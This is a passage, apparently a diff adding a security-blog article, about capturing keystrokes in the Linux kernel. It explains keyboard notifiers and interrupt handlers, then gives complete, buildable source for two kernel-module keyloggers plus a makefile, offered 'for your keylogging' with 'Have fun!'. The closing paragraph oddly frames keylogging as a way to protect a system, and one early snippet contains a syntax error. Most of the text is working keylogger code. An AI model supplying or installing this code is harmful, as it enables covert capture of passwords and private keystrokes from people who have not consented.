+   are KG_*. The value of the keyboard notifier depends on the event type. Here are a few of the
+   options:
+     * **KBD_KEYCODE** has value as the keycode and is sent before other events.
+     * **KBD_UNBOUND_KEYCODE** events occur if the event does not tie to keysym values in the keycode.
+     * **KBD_UNICODE** will be sent if the keycode → keysym translation produced is a unicode character
+       and value.
+     * **KBD_KEYSYM** results from non-unicode characters produced from keycode → keysym translations,
+       and the value is keysym.
+     * **KBD_POST_KEYSYM** are events they send after non-unicode keysyms undergo treatment. This
+       keyboard notifier permits LED inspections.
+
+   For more details and information, refer to kbd_keycode() in drivers/tty/vt/keyboard.c.
+
+How Can I Use Keylogging in Linux Kernels?
+   Let's discuss the two ways you can capture keyboard events in the kernel:
+
+How Can I Capture Keyboard Events with a Notifier?
+   Start by registering your keyboard notifier blocks. Check the callback for KBD_KEYCODE events and
+   extract any keycodes. Convert keycodes to readable strings by mapping them on a standard EN-US
+   keyboard map. Here is what the event notification callback can look like:
+
+
+int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param) {
+	char keybuf[12] = {0};
+	struct keyboard_notifier_param *param = _param;
+
+	if (!(param->down)) return NOTIFY_OK;
+
+	keycode_to_string(param->value, param->shift, keybuf, 12);
+
+	if (strlen(keybuf); < 1) return NOTIFY_OK;
+
+	printk(KERN_INFO "Keylog: %s", keybuf);
+
+	return NOTIFY_OK;
+}
+
+    With this coding, you can register a handler at load time or unregister it at unload time:
+
+	static struct notifier_block keysniffer_blk = {
+		.notifier_call = keyboard_event_handler,
+	};
+
+static int __init keylogger_init(void) {
+	register_keyboard_notifier(&keysniffer_blk);
+	return 0;
+}
+
+static void __exit keylogger_exit(void) {
+	unregister_keyboard_notifier(&keysniffer_blk);
+}
+
+   Map incoming keycodes to corresponding ones with mapping. The complete listing of implementation
+   references is at the end of the article.
+
+How Can I Capture Keyboard Events with My Interrupt Handler?
+
+   Linux Software Security1png We can have multiple interrupt request handlers by following these steps:
+     * Install an interrupt handler.
+     * Capture the keycode from the keyboard.
+     * Map the keycode to the key name.
+     * Log that information somewhere secure.
+
+   Unfortunately, this setup can cause some network security issues. We should not be performing the
+   logging aspect of the request handler since interrupts like to move quickly without blockage.
+   Deferred actions are useful in these instances, as you can use such actions to log captured data so
+   the interrupt handler can complete its job. Then, we can use a "tasklet" function to run the
+   interrupt context.
+
+   Since this is a low level of work, we need to deal with keycode extractions independently. Most
+   laptop keyboards use PS/2 interfaces to talk to a host, so we will utilize such in our explanations.
+   PS/2 keyboards generally use two ports for communication: the 0x60 Data Register and the 0x64 Command
+   Register, both to read and write. Keycodes will be the data we look at through the keypress events
+   that can help us get information from port 0x0 in our interrupt handler. Write a minimal IRQ handler
+   like this:
+
+irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs) {
+	scancode = inb(0x60);
+	return (irq_handler_t)IRQ_HANDLED;
+}
+
+The tasklet can be defined as shown below:
+
+void tasklet_logger(unsigned long dummy) {
+	...
+}
+
+DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);
+
+Now we can register our tasklet and IRQ handlers as shown below:
+
+irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs) {
+	data.scancode = inb(0x60);
+	tasklet_schedule(&my_tasklet);
+	return (irq_handler_t)IRQ_HANDLED;
+}
+
+static int __init kb_init(void) {
+	int ret;
+
+	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED, "custom handler", &data);
+
+	if (ret != 0) {
+		printk(KERN_INFO "keylogger: Cannot request IRQ for keyboard.\n");
+	}
+
+	return ret;
+}
+
+static void __exit kb_exit(void) {
+	tasklet_kill(&my_tasklet);
+	free_irq(KB_IRQ, &data);
+}
+
+
+What is the Complete Source Code?
+   Here are the codes in their completion so you can utilize them for your keylogging:
+
+Linux Keylogger Using Keyboard Notifier
+
+#include <linux/module.h>
+#include <linux/keyboard.h>
+#include <linux/input.h>
+
+MODULE_LICENSE("GPL");
+
+static const char *us_keymap[][2] = {
+	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
+	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
+	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
+	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
+	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
+	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
+	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
+	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
+	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
+	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
+	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
+	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
+	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
+	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
+	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
+	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
+	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
+	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
+	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
+	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
+	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
+	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
+	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
+	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
+	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
+	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
+	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
+	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
+	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
+	{"_PAUSE_", "_PAUSE_"},                                         // 119
+};
+
+void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size) {
+	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
+		const char *us_key = (shift_mask == 1)
+			? us_keymap[keycode][1]
+			: us_keymap[keycode][0];
+
+		snprintf(buf, buf_size, "%s", us_key);
+	}
+}
+
+int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param) {
+	char keybuf[12] = {0};
+	struct keyboard_notifier_param *param = _param;
+
+	if (!(param->down)) return NOTIFY_OK;
+
+	keycode_to_string(param->value, param->shift, keybuf, 12);
+
+	if (strlen(keybuf) < 1) return NOTIFY_OK;
+
+	printk(KERN_INFO "Keylog: %s", keybuf);
+
+	return NOTIFY_OK;
+}
+
+static struct notifier_block keysniffer_blk = {
+	.notifier_call = keyboard_event_handler,
+};
+
+static int __init keylogger_init(void) {
+	register_keyboard_notifier(&keysniffer_blk);
+	return 0;
+}
+
+static void __exit keylogger_exit(void) {
+	unregister_keyboard_notifier(&keysniffer_blk);
+}
+
+module_init(keylogger_init);
+module_exit(keylogger_exit);
+
+
+Linux Keylogging Using Custom Keyboard Interrupt Handler
+
+#include <linux/module.h>
+#include <linux/interrupt.h>
+#include <asm/io.h>
+#include <linux/string.h>
+
+#define KB_IRQ 1
+
+struct logger_data{
+	unsigned char scancode;
+} data;
+
+void tasklet_logger(unsigned long dummy) {
+	static int shift = 0;
+
+	char buf[32];
+	memset(buf, 0, sizeof(buf));
+	switch(data.scancode) {
+		default: return;
+
+		case  1: strcpy(buf, "(ESC)"); break;
+		case  2: strcpy(buf, (shift) ? "!" : "1"); break;
+		case  3: strcpy(buf, (shift) ? "@" : "2"); break;
+		case  4: strcpy(buf, (shift) ? "#" : "3"); break;
+		case  5: strcpy(buf, (shift) ? "$" : "4"); break;
+		case  6: strcpy(buf, (shift) ? "%" : "5"); break;
+		case  7: strcpy(buf, (shift) ? "^" : "6"); break;
+		case  8: strcpy(buf, (shift) ? "&" : "7"); break;
+		case  9: strcpy(buf, (shift) ? "*" : "8"); break;
+		case 10: strcpy(buf, (shift) ? "(" : "9"); break;
+		case 11: strcpy(buf, (shift) ? ")" : "0"); break;
+		case 12: strcpy(buf, (shift) ? "_" : "-"); break;
+		case 13: strcpy(buf, (shift) ? "+" : "="); break;
+		case 14: strcpy(buf, "(BACK)"); break;
+		case 15: strcpy(buf, "(TAB)"); break;
+		case 16: strcpy(buf, (shift) ? "Q" : "q"); break;
+		case 17: strcpy(buf, (shift) ? "W" : "w"); break;
+		case 18: strcpy(buf, (shift) ? "E" : "e"); break;
+		case 19: strcpy(buf, (shift) ? "R" : "r"); break;
+		case 20: strcpy(buf, (shift) ? "T" : "t"); break;
+		case 21: strcpy(buf, (shift) ? "Y" : "y"); break;
+		case 22: strcpy(buf, (shift) ? "U" : "u"); break;
+		case 23: strcpy(buf, (shift) ? "I" : "i"); break;
+		case 24: strcpy(buf, (shift) ? "O" : "o"); break;
+		case 25: strcpy(buf, (shift) ? "P" : "p"); break;
+		case 26: strcpy(buf, (shift) ? "{" : "["); break;
+		case 27: strcpy(buf, (shift) ? "}" : "]"); break;
+		case 28: strcpy(buf, "(ENTER)"); break;
+		case 29: strcpy(buf, "(CTRL)"); break;
+		case 30: strcpy(buf, (shift) ? "A" : "a"); break;
+		case 31: strcpy(buf, (shift) ? "S" : "s"); break;
+		case 32: strcpy(buf, (shift) ? "D" : "d"); break;
+		case 33: strcpy(buf, (shift) ? "F" : "f"); break;
+		case 34: strcpy(buf, (shift) ? "G" : "g"); break;
+		case 35: strcpy(buf, (shift) ? "H" : "h"); break;
+		case 36: strcpy(buf, (shift) ? "J" : "j"); break;
+		case 37: strcpy(buf, (shift) ? "K" : "k"); break;
+		case 38: strcpy(buf, (shift) ? "L" : "l"); break;
+		case 39: strcpy(buf, (shift) ? ":" : ";"); break;
+		case 40: strcpy(buf, (shift) ? "\"" : "'"); break;
+		case 41: strcpy(buf, (shift) ? "~" : "`"); break;
+		case 42:
+		case 54: shift = 1; break;
+		case 170:
+		case 182: shift = 0; break;
+		case 44: strcpy(buf, (shift) ? "Z" : "z"); break;
+		case 45: strcpy(buf, (shift) ? "X" : "x"); break;
+		case 46: strcpy(buf, (shift) ? "C" : "c"); break;
+		case 47: strcpy(buf, (shift) ? "V" : "v"); break;
+		case 48: strcpy(buf, (shift) ? "B" : "b"); break;
+		case 49: strcpy(buf, (shift) ? "N" : "n"); break;
+		case 50: strcpy(buf, (shift) ? "M" : "m"); break;
+		case 51: strcpy(buf, (shift) ? "<" : ","); break;
+		case 52: strcpy(buf, (shift) ? ">" : "."); break;
+		case 53: strcpy(buf, (shift) ? "?" : "/"); break;
+		case 56: strcpy(buf, "(R-ALT"); break;
+		case 55:
+		case 57:
+		case 58:
+		case 59:
+		case 60:
+		case 61:
+		case 62:
+		case 63:
+		case 64:
+		case 65:
+		case 66:
+		case 67:
+		case 68:
+		case 70:
+		case 71:
+		case 72: strcpy(buf, " "); break;
+		case 83:
+				 strcpy(buf, "(DEL)"); break;
+	}
+	printk(KERN_INFO "keylogger log: %s", buf);
+}
+
+DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);
+
+irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs) {
+	data.scancode = inb(0x60);
+
+	tasklet_schedule(&my_tasklet);
+	return (irq_handler_t)IRQ_HANDLED;
+}
+
+static int __init kb_init(void) {
+	int ret;
+	printk(KERN_INFO "keylogger: initializing...");
+
+	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED, "custom handler", &data);
+	if (ret != 0) {
+		printk(KERN_INFO "keylogger: Cannot request IRQ for keyboard.\n");
+	}
+
+	printk(KERN_INFO "keylogger: initialization complete.");
+
+	return ret;
+}
+
+static void __exit kb_exit(void) {
+	tasklet_kill(&my_tasklet);
+
+	free_irq(KB_IRQ, &data);
+
+	printk(KERN_INFO "keylogger: unloaded.");
+}
+
+MODULE_LICENSE("GPL");
+
+module_init(kb_init);
+module_exit(kb_exit);
+
+   You can use the following makefile to compile these:
+
+obj-m += keylogger.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+   Have fun!
+
+Final Thoughts on Kernel Interrupt Handlers
+   Preventing attacks in network security within your Linux kernel is essential to combating cloud
+   security breaches from harming your server. Utilize interrupt handlers when keylogging so you can
+   protect your system from any risk that may come your way. Look back at part 1 and part 2 of
+   this Complete Guide if you haven't already, and have fun while you improve your security posture!
+
+
+
+---
+
